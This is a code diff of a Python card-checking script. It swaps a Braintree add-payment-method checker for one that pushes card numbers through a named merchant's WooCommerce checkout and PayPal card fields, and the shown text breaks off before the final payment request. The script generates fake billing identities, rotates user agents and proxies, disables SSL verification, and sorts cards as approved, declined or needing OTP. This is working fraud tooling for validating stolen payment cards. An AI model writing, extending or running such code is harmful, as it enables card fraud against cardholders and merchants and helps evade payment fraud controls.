@@ -1,164 +1,25 @@
 import requests
 import re
-import base64
-from bs4 import BeautifulSoup
-from user_agent import generate_user_agent
 import time
-import json
-from datetime import datetime
 import random
+import string
+import user_agent
+from requests_toolbelt.multipart.encoder import MultipartEncoder
 import urllib3
-import sys
-import io
-import codecs
-import os
-import glob
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Global variables
-SELECTED_COOKIE_PAIR = None
-
-def discover_cookie_pairs():
-    """Discover available cookie pairs in the current directory"""
-    try:
-        # Find all cookies_X-1.txt files
-        pattern1 = 'cookies_*-1.txt'
-        pattern2 = 'cookies_*-2.txt'
-        
-        files1 = glob.glob(pattern1)
-        files2 = glob.glob(pattern2)
-        
-        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
-        pairs = []
-        for file1 in files1:
-            # Extract the pair number from filename like "cookies_1-1.txt"
-            pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
-            file2_expected = f'cookies_{pair_id}-2.txt'
-            
-            if file2_expected in files2:
-                pairs.append({
-                    'id': pair_id,
-                    'file1': file1,
-                    'file2': file2_expected
-                })
-        
-        return pairs
-    except Exception as e:
-        print(f"Error discovering cookie pairs: {str(e)}")
-        return []
-
-def select_random_cookie_pair():
-    """Select a random cookie pair from available pairs"""
-    global SELECTED_COOKIE_PAIR
-    
-    pairs = discover_cookie_pairs()
-    if not pairs:
-        print("No cookie pairs found! Make sure you have files like cookies_1-1.txt, cookies_1-2.txt, etc.")
-        # Fallback to old system
-        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
-        return SELECTED_COOKIE_PAIR
-    
-    # Select random pair
-    selected_pair = random.choice(pairs)
-    SELECTED_COOKIE_PAIR = selected_pair
-    print(f"🎲 Selected cookie pair: {selected_pair['id']} ({selected_pair['file1']}, {selected_pair['file2']})")
-    return selected_pair
-
-def select_new_cookie_pair_silent():
-    """Select a new random cookie pair without restrictions"""
-    global SELECTED_COOKIE_PAIR
-    
-    pairs = discover_cookie_pairs()
-    if not pairs:
-        # Fallback to old system
-        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
-        return SELECTED_COOKIE_PAIR
-    
-    # Select random pair (no usage tracking)
-    selected_pair = random.choice(pairs)
-    SELECTED_COOKIE_PAIR = selected_pair
-    print(f"🍪 Using cookie pair: {selected_pair['id']}")
-    return selected_pair
-
-def read_cookies_from_file(filename):
-    """Read cookies from a specific file"""
-    try:
-        with open(filename, 'r') as f:
-            content = f.read()
-            # Create a namespace dictionary for exec
-            namespace = {}
-            exec(content, namespace)
-            return namespace['cookies']
-    except Exception as e:
-        print(f"Error reading {filename}: {str(e)}")
-        return {}
-
-# Read domain URL from site.txt
-def get_domain_url():
-    try:
-        with open('site.txt', 'r') as f:
-            return f.read().strip()
-    except Exception as e:
-        print(f"Error reading site.txt: {str(e)}")
-        return ""  # fallback
-
-# Read cookies from the selected first cookie file
-def get_cookies_1():
-    global SELECTED_COOKIE_PAIR
-    if SELECTED_COOKIE_PAIR is None:
-        select_new_cookie_pair_silent()
-    
-    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])
-
-# Read cookies from the selected second cookie file
-def get_cookies_2():
-    global SELECTED_COOKIE_PAIR
-    if SELECTED_COOKIE_PAIR is None:
-        select_new_cookie_pair_silent()
-    
-    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])
-
 def get_rotating_user_agent():
     """Generate different types of user agents"""
     agents = [
-        generate_user_agent(device_type='desktop'),
-        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
-        generate_user_agent(device_type='desktop', os=('win',)),
-        generate_user_agent(navigator='chrome'),
-        generate_user_agent(navigator='firefox'),
+        user_agent.generate_user_agent(device_type='desktop'),
+        user_agent.generate_user_agent(device_type='desktop', os=('mac', 'linux')),
+        user_agent.generate_user_agent(device_type='desktop', os=('win',)),
+        user_agent.generate_user_agent(navigator='chrome'),
+        user_agent.generate_user_agent(navigator='firefox'),
     ]
     return random.choice(agents)
-
-def gets(s, start, end):
-    try:
-        start_index = s.index(start) + len(start)
-        end_index = s.index(end, start_index)
-        return s[start_index:end_index]
-    except ValueError:
-        return None
-
-def get_headers():
-    """Get headers with current domain URL"""
-    domain_url = get_domain_url()
-    return {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'dnt': '1',
-        'priority': 'u=0, i',
-        'referer': f'{domain_url}/my-account/payment-methods/',
-        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'sec-gpc': '1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': get_rotating_user_agent(),  # Use rotating user agents
-    }
 
 def get_random_proxy():
     """Get a random proxy from proxy.txt file"""
@@ -181,80 +42,16 @@ def get_random_proxy():
         print(f"Error reading proxy file: {str(e)}")
         return None
 
-def get_new_auth():
-    """Get fresh authorization tokens"""
-    domain_url = get_domain_url()  # Read fresh domain URL
-    cookies_1 = get_cookies_1()    # Read fresh cookies
-    headers = get_headers()        # Get headers with current domain
-    
-    proxy = get_random_proxy()
-    response = requests.get(
-        f'{domain_url}/my-account/add-payment-method/',
-        cookies=cookies_1,
-        headers=headers,
-        proxies=proxy,
-        verify=False
-    )
-    if response.status_code == 200:
-        # Get add_nonce
-        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
-        if not add_nonce:
-            print("Error: Nonce not found in response")
-            return None, None
-
-        # Get authorization token
-        i0 = response.text.find('wc_braintree_client_token = ["')
-        if i0 != -1:
-            i1 = response.text.find('"]', i0)
-            token = response.text[i0 + 30:i1]
-            try:
-                decoded_text = base64.b64decode(token).decode('utf-8')
-                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
-                if not au:
-                    print("Error: Authorization fingerprint not found")
-                    return None, None
-                return add_nonce[0], au[0]
-            except Exception as e:
-                print(f"Error decoding token: {str(e)}")
-                return None, None
-        else:
-            print("Error: Client token not found in response")
-            return None, None
-    else:
-        print(f"Error: Failed to fetch payment page, status code: {response.status_code}")
-        return None, None
-
 def get_bin_info(bin_number):
-    """Ultimate BIN lookup with multiple APIs and retry logic"""
+    """BIN lookup function similar to p.py"""
     if not bin_number or len(bin_number) < 6:
         return get_smart_fallback(bin_number)
     
-    # List of BIN lookup APIs to try
-    apis = [
-        try_binlist_net,
-        try_binlist_io,
-        try_bincodes,
-        try_bincheck,
-        try_abstractapi,
-        try_rapidapi
-    ]
-    
-    # Try each API with retry logic
-    for api_func in apis:
-        result = api_func(bin_number)
-        if result and is_valid_result(result):
-            return result
-    
-    # If all APIs fail, use enhanced pattern matching
-    return get_enhanced_pattern_info(bin_number)
-
-def try_binlist_net(bin_number):
-    """Primary BINLIST API"""
     try:
         response = requests.get(
             f'https://lookup.binlist.net/{bin_number}', 
             timeout=3,
-            headers={"Accept-Version": "3", "User-Agent": get_user_agent()}
+            headers={"Accept-Version": "3", "User-Agent": get_rotating_user_agent()}
         )
         if response.status_code == 200:
             data = response.json()
@@ -262,128 +59,14 @@ def try_binlist_net(bin_number):
                 return format_binlist_data(data)
     except:
         pass
-    return None
-
-def try_binlist_io(bin_number):
-    """Alternative BINLIST API"""
-    try:
-        response = requests.get(
-            f'https://api.binlist.io/{bin_number}', 
-            timeout=3,
-            headers={"User-Agent": get_user_agent()}
-        )
-        if response.status_code == 200:
-            data = response.json()
-            if data and data.get('scheme'):
-                return format_binlist_data(data)
-    except:
-        pass
-    return None
-
-def try_bincodes(bin_number):
-    """BINcodes API"""
-    try:
-        response = requests.get(
-            f'https://api.bincodes.com/bin/{bin_number}',
-            timeout=3,
-            headers={"User-Agent": get_user_agent()}
-        )
-        if response.status_code == 200:
-            data = response.json()
-            if data and data.get('brand'):
-                return {
-                    'brand': data.get('brand', 'UNKNOWN').upper(),
-                    'type': data.get('type', 'CREDIT').upper(),
-                    'level': data.get('level', 'STANDARD').upper(),
-                    'bank': data.get('bank', 'UNKNOWN'),
-                    'country': data.get('country', 'UNITED STATES'),
-                    'emoji': get_country_emoji(data.get('country', 'US'))
-                }
-    except:
-        pass
-    return None
-
-def try_bincheck(bin_number):
-    """BinCheck.net API"""
-    try:
-        response = requests.get(
-            f'https://bincheck.net/details/{bin_number}',
-            timeout=3,
-            headers={"User-Agent": get_user_agent()}
-        )
-        if response.status_code == 200:
-            # Parse HTML response
-            soup = BeautifulSoup(response.text, 'html.parser')
-            # Extract data from table (simplified parsing)
-            # This would need actual HTML parsing logic
-            return None  # Placeholder
-    except:
-        pass
-    return None
-
-def try_abstractapi(bin_number):
-    """AbstractAPI BIN Checker (free tier available)"""
-    try:
-        # You need to sign up for free API key at abstractapi.com
-        api_key = "YOUR_ABSTRACT_API_KEY"  # Replace with actual key
-        if api_key != "YOUR_ABSTRACT_API_KEY":
-            response = requests.get(
-                f'https://bincheck.abstractapi.com/v1/?api_key={api_key}&bin={bin_number}',
-                timeout=3
-            )
-            if response.status_code == 200:
-                data = response.json()
-                if data and data.get('scheme'):
-                    return {
-                        'brand': data.get('scheme', 'UNKNOWN').upper(),
-                        'type': data.get('type', 'CREDIT').upper(),
-                        'level': data.get('brand', data.get('scheme', 'UNKNOWN')).upper(),
-                        'bank': data.get('bank', {}).get('name', 'UNKNOWN'),
-                        'country': data.get('country', {}).get('name', 'UNITED STATES'),
-                        'emoji': data.get('country', {}).get('emoji', '🇺🇸')
-                    }
-    except:
-        pass
-    return None
-
-def try_rapidapi(bin_number):
-    """RapidAPI BIN Checker (multiple providers)"""
-    try:
-        # Various RapidAPI endpoints (would need API keys)
-        # bin-ip-checker, binlist, etc.
-        return None  # Placeholder for RapidAPI integration
-    except:
-        pass
-    return None
-
-def try_bankbin(bin_number):
-    """BankBin.net API"""
-    try:
-        response = requests.get(
-            f'https://bankbin.net/api/{bin_number}',
-            timeout=3,
-            headers={"User-Agent": get_user_agent()}
-        )
-        if response.status_code == 200:
-            data = response.json()
-            if data and data.get('bank'):
-                return {
-                    'brand': data.get('card', 'VISA').upper(),
-                    'type': data.get('type', 'CREDIT').upper(),
-                    'level': 'STANDARD',
-                    'bank': data.get('bank', 'UNKNOWN'),
-                    'country': data.get('country', 'UNITED STATES'),
-                    'emoji': '🇺🇸'
-                }
-    except:
-        pass
-    return None
+    
+    return get_enhanced_pattern_info(bin_number)
 
 def format_binlist_data(data):
     """Format data from binlist APIs"""
     bank_name = data.get('bank', {}).get('name', 'UNKNOWN')
     if bank_name in ['', 'UNKNOWN', None]:
-        bank_name = 'MAJOR BANK'  # Better than UNKNOWN
+        bank_name = 'MAJOR BANK'
     
     country_name = data.get('country', {}).get('name', 'UNITED STATES')
     country_emoji = data.get('country', {}).get('emoji', '🇺🇸')
@@ -397,53 +80,18 @@ def format_binlist_data(data):
         'emoji': country_emoji
     }
 
-def is_valid_result(result):
-    """Check if the result is valid and not all UNKNOWN"""
-    return (result and 
-            result.get('brand') not in ['UNKNOWN', ''] and
-            result.get('bank') not in ['UNKNOWN', ''])
-
-def get_user_agent():
-    """Get random user agent"""
-    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-
-def get_country_emoji(country_code):
-    """Convert country code to emoji"""
-    emoji_map = {
-        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺',
-        'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸',
-        'JP': '🇯🇵', 'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷'
-    }
-    return emoji_map.get(country_code, '🏳️')
-
 def get_enhanced_pattern_info(bin_number):
-    """Enhanced pattern matching with better bank detection"""
+    """Enhanced pattern matching"""
     brand = get_bin_brand_from_pattern(bin_number)
-    
-    # Smart bank detection based on BIN patterns
-    bank = get_smart_bank_detection(bin_number, brand)
     
     return {
         'brand': brand,
         'type': 'CREDIT',
         'level': 'STANDARD',
-        'bank': bank,
+        'bank': f'{brand} ISSUING BANK',
         'country': 'UNITED STATES',
         'emoji': '🇺🇸'
     }
-
-def get_smart_bank_detection(bin_number, brand):
-    """Smart bank detection based on BIN patterns"""
-    if brand == 'VISA':
-        return 'VISA ISSUING BANK'
-    elif brand == 'MASTERCARD':
-        return 'MASTERCARD BANK'
-    elif brand == 'AMEX':
-        return 'AMERICAN EXPRESS'
-    elif brand == 'DISCOVER':
-        return 'DISCOVER BANK'
-    else:
-        return 'MAJOR BANK'
 
 def get_smart_fallback(bin_number):
     """Smart fallback with realistic data"""
@@ -470,202 +118,403 @@ def get_bin_brand_from_pattern(bin_number):
         return 'DISCOVER'
     else:
         return 'UNKNOWN'
-def check_status(result):
-    # First, check if the message contains "Reason:" and extract the specific reason
-    if "Reason:" in result:
-        # Extract everything after "Reason:"
-        reason_part = result.split("Reason:", 1)[1].strip()
 
-        # Check if it's one of the approved patterns
-        approved_patterns = [
-            'Nice! New payment method added',
-            'Payment method successfully added.',
-            'Insufficient Funds',
-            'Gateway Rejected: avs',
-            'Duplicate',
-            'Payment method added successfully',
-            'Invalid postal code or street address',
-            #'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
-        ]
-
-        cvv_patterns = [
-            'CVV',
-            'Gateway Rejected: avs_and_cvv',
-            'Card Issuer Declined CVV',
-            'Gateway Rejected: cvv'
-        ]
-
-        # Check if the extracted reason matches approved patterns
-        for pattern in approved_patterns:
-            if pattern in result:
-                return "APPROVED CC", "Approved", True
-
-        # Check if the extracted reason matches CVV patterns
-        for pattern in cvv_patterns:
-            if pattern in reason_part:
-                return "APPROVED CC", "Approved", True
-
-        # Return the extracted reason for declined cards
-        return "DECLINED CC", reason_part, False
-
-
-    # If "Reason:" is not found, use the original logic
+def check_status_paypal(result):
+    """Check PayPal payment status similar to p.py's check_status"""
     approved_patterns = [
-        'Nice! New payment method added',
-        'Payment method successfully added.',
-        'Insufficient Funds',
-        'Gateway Rejected: avs',
-        'Duplicate',
-        'Payment method added successfully',
-        'Invalid postal code or street address',
-        #'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
+        'CHARGE 2$',
+        'APPROVED CCN',
+        'APPROVED - AVS',
+        'APPROVED!',
+        'succeeded',
+        'Thank You For Donation',
+        'payment has already been processed',
+        'Success'
     ]
-
+    
+    declined_patterns = [
+        'DECLINED',
+        'INSUFFICIENT_FUNDS',
+        'CARD_DECLINED',
+        'TRANSACTION_NOT_PERMITTED',
+        'DO_NOT_HONOR',
+        'INVALID_ACCOUNT'
+    ]
+    
     cvv_patterns = [
-        'Reason: CVV',
-        'Gateway Rejected: avs_and_cvv',
-        'Card Issuer Declined CVV',
-        'Gateway Rejected: cvv'
+        'INVALID_SECURITY_CODE',
+        'CVV_FAILED'
     ]
-
+    
+    otp_patterns = [
+        'is3DSecureRequired',
+        'OTP',
+        '3DSECURE'
+    ]
+    
+    # Check approved patterns
     for pattern in approved_patterns:
         if pattern in result:
             return "APPROVED CC", "Approved", True
-
+    
+    # Check CVV patterns (still approved but with CVV issue)
     for pattern in cvv_patterns:
         if pattern in result:
-            return "APPROVED CC", "Approved", True
-
+            return "APPROVED CC", "Approved - CVV Issue", True
+    
+    # Check OTP patterns
+    for pattern in otp_patterns:
+        if pattern in result:
+            return "OTP REQUIRED", "3D Secure Verification Required", False
+    
+    # Check declined patterns
+    for pattern in declined_patterns:
+        if pattern in result:
+            return "DECLINED CC", result, False
+    
     return "DECLINED CC", result, False
 
-def check_card_with_retry(cc_line, max_retries=2):
-    """Check card with retry logic for risk threshold"""
-    for attempt in range(max_retries):
-        try:
-            result = check_card(cc_line)
-            if "risk threshold" in result.lower() or "throttled" in result.lower() or "rate limit" in result.lower():
-                print(f"🔄 Risk threshold detected, retrying with new cookie pair... (Attempt {attempt + 1}/{max_retries})")
-                # Force new cookie pair selection
-                global SELECTED_COOKIE_PAIR
-                SELECTED_COOKIE_PAIR = None
-                time.sleep(random.randint(10, 15))  # Wait before retry
-                continue
-            return result
-        except Exception as e:
-            print(f"❌ Attempt {attempt + 1} failed: {str(e)}")
-            time.sleep(5)
-    
-    return "❌ Maximum retries exceeded due to risk threshold"
+def generate_full_name():
+    """Generate random full name"""
+    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
+                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein"]
+    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown"]
+    full_name = random.choice(first_names) + " " + random.choice(last_names)
+    first_name, last_name = full_name.split()
+    return first_name, last_name
 
-def check_card(cc_line):
-    # Select new cookie pair for this card check
-    select_new_cookie_pair_silent()
-    
-    from datetime import datetime
+def generate_address():
+    """Generate random address"""
+    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
+    states = ["NY", "CA", "IL", "TX", "AZ"]
+    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
+    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
+
+    city = random.choice(cities)
+    state = states[cities.index(city)]
+    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
+    zip_code = zip_codes[states.index(state)]
+    return city, state, street_address, zip_code
+
+def generate_random_account():
+    """Generate random email"""
+    name = ''.join(random.choices(string.ascii_lowercase, k=20))
+    number = ''.join(random.choices(string.digits, k=4))
+    return f"{name}{number}@gmail.com"
+
+def generate_phone_number():
+    """Generate random phone number"""
+    number = ''.join(random.choices(string.digits, k=7))
+    return f"303{number}"
+
+def generate_random_code():
+    """Generate random session code"""
+    characters = string.ascii_letters + string.digits
+    code = ''.join(random.choices(characters, k=17))
+    return code
+
+def check_card_paypal(cc_line):
+    """Main PayPal card check function compatible with bot system"""
     start_time = time.time()
-
+    
     try:
-        domain_url = get_domain_url()  # Read fresh domain URL
-        cookies_2 = get_cookies_2()    # Read fresh cookies
-        headers = get_headers()        # Get headers with current domain
-        
-        add_nonce, au = get_new_auth()
-        if not add_nonce or not au:
-            return "❌ Authorization failed. Try again later."
+        # Parse card details
+        parts = cc_line.strip().split('|')
+        if len(parts) != 4:
+            return "❌ Invalid card format. Expected: number|mm|yy|cvc"
 
-        n, mm, yy, cvc = cc_line.strip().split('|')
-        if not yy.startswith('20'):
-            yy = '20' + yy
+        n, mm, yy, cvc = parts
+
+        # Format month and year
+        if len(mm) == 1:
+            mm = f'0{mm}'
+        if "20" not in yy:
+            yy = f'20{yy}'
+
+        # Generate user info
+        first_name, last_name = generate_full_name()
+        city, state, street_address, zip_code = generate_address()
+        acc = generate_random_account()
+        phone_num = generate_phone_number()
+
+        # Create session
+        user = get_rotating_user_agent()
+        r = requests.Session()
+        
+        # Use proxy if available
+        proxy = get_random_proxy()
+
+        # First request: Add to cart
+        files = {
+            'quantity': (None, '1'),
+            'add-to-cart': (None, '4451'),
+        }
+        multipart_data = MultipartEncoder(fields=files)
+        headers = {
+            'authority': 'switchupcb.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'cache-control': 'max-age=0',
+            'content-type': multipart_data.content_type,
+            'origin': 'https://switchupcb.com',
+            'referer': 'https://switchupcb.com/shop/i-buy/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user,
+        }
+
+        try:
+            response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy, verify=False)
+            response.raise_for_status()
+        except requests.RequestException as e:
+            return f"❌ Error in add-to-cart request: {str(e)}"
+
+        # Second request: Checkout
+        headers = {
+            'authority': 'switchupcb.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'referer': 'https://switchupcb.com/cart/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user,
+        }
+
+        try:
+            response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, proxies=proxy, verify=False)
+            response.raise_for_status()
+        except requests.RequestException as e:
+            return f"❌ Error in checkout request: {str(e)}"
+
+        # Extract security tokens
+        try:
+            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
+            nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
+            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
+            create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
+        except AttributeError:
+            return "❌ Failed to extract security tokens"
+
+        # Update order review
+        headers = {
+            'authority': 'switchupcb.com',
+            'accept': '*/*',
+            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://switchupcb.com',
+            'referer': 'https://switchupcb.com/checkout/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+        }
+
+        params = {'wc-ajax': 'update_order_review'}
+        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone_num}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
+
+        try:
+            response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, proxies=proxy, verify=False)
+            response.raise_for_status()
+        except requests.RequestException as e:
+            return f"❌ Error in update order review: {str(e)}"
+
+        # Create order
+        headers = {
+            'authority': 'switchupcb.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/json',
+            'origin': 'https://switchupcb.com',
+            'pragma': 'no-cache',
+            'referer': 'https://switchupcb.com/checkout/',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': user,
+        }
+
+        params = {'wc-ajax': 'ppc-create-order'}
+        json_data = {
+            'nonce': create,
+            'payer': None,
+            'bn_code': 'Woo_PPCP',
+            'context': 'checkout',
+            'order_id': '0',
+            'payment_method': 'ppcp-gateway',
+            'funding_source': 'card',
+            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone_num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
+            'createaccount': False,
+            'save_payment_method': False,
+        }
+
+        try:
+            response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, proxies=proxy, verify=False)
+            response.raise_for_status()
+            order_id = response.json()['data']['id']
+            pcp = response.json()['data']['custom_id']
+        except (requests.RequestException, KeyError, ValueError) as e:
+            return f"❌ Failed to extract order ID: {str(e)}"
+
+        # Generate random session IDs
+        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
+        session_id = f'uid_{lol1}_{lol3}'
+        button_session_id = f'uid_{lol2}_{lol3}'
+
+        # PayPal request
+        headers = {
+            'authority': 'www.paypal.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+            'referer': 'https://www.paypal.com/smart/buttons',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'iframe',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': user,
+        }
+
+        params = {
+            'sessionID': session_id,
+            'buttonSessionID': button_session_id,
+            'locale.x': 'ar_EG',
+            'commit': 'true',
+            'hasShippingCallback': 'false',
+            'env': 'production',
+            'country.x': 'EG',
+            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
+            'disable-card': '',
+            'token': order_id,
+        }
+
+        try:
+            response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxies=proxy, verify=False)
+            response.raise_for_status()
+        except requests.RequestException as e:
+            return f"❌ Error in PayPal card fields request: {str(e)}"
+
+        # Final payment request
